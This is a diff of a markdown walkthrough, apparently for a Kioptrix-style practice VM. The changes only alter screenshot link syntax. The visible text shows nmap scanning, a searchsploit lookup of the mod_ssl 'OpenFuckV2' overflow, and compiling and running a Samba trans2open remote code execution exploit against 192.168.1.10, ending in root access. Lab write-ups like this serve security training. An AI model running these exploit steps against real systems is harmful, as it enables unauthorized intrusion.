@@ -8,7 +8,7 @@
 
 **nmap -sC -sV 192.168.1.10**
 
-https://user-images.githubusercontent.com/15195048/95851965-4c63fd00-0d53-11eb-9b2a-855be54df5ba.png
+![kio2]https://user-images.githubusercontent.com/15195048/95851965-4c63fd00-0d53-11eb-9b2a-855be54df5ba.png
 
 ## 1. Exploiting Apache 
 
@@ -19,7 +19,7 @@ Exploits: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow
 
 **searchsploit mod_ssl**
 
-https://user-images.githubusercontent.com/15195048/95851966-4cfc9380-0d53-11eb-911e-2d0536d6b4b3.png
+![kio3]https://user-images.githubusercontent.com/15195048/95851966-4cfc9380-0d53-11eb-911e-2d0536d6b4b3.png
  
 ## A) ExploitDB 
 Link:https://www.exploit-db.com/exploits/764
@@ -43,7 +43,7 @@ error
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-https://user-images.githubusercontent.com/15195048/95851969-4cfc9380-0d53-11eb-98d4-8b7642f08530.png
+![kio4]https://user-images.githubusercontent.com/15195048/95851969-4cfc9380-0d53-11eb-98d4-8b7642f08530.png
 
 ## 2. Samba Exploit
 
@@ -59,12 +59,12 @@ https://user-images.githubusercontent.com/15195048/95851969-4cfc9380-0d53-11eb-9
 https://github.com/amitn322/smb-version/blob/master/samba_version.py
 python smb-version/samba_version.py -s 192.168.1.10
 
-https://user-images.githubusercontent.com/15195048/95851970-4d952a00-0d53-11eb-9d2a-27844dc33287.png
+![kio6]https://user-images.githubusercontent.com/15195048/95851970-4d952a00-0d53-11eb-9d2a-27844dc33287.png
 
 Samba2.2
 searchsploit samba 2.2
 
-https://user-images.githubusercontent.com/15195048/95851974-4e2dc080-0d53-11eb-9467-a88125c91e68.png
+![kio27]https://user-images.githubusercontent.com/15195048/95851974-4e2dc080-0d53-11eb-9467-a88125c91e68.png
 
 
 Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
@@ -77,6 +77,6 @@ gcc 10.c
 ./a.out -b -o 192.168.1.10
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-https://user-images.githubusercontent.com/15195048/95851983-4ec65700-0d53-11eb-98ea-370a424c4437.png
+![kio8]https://user-images.githubusercontent.com/15195048/95851983-4ec65700-0d53-11eb-98ea-370a424c4437.png
 
 Rooted
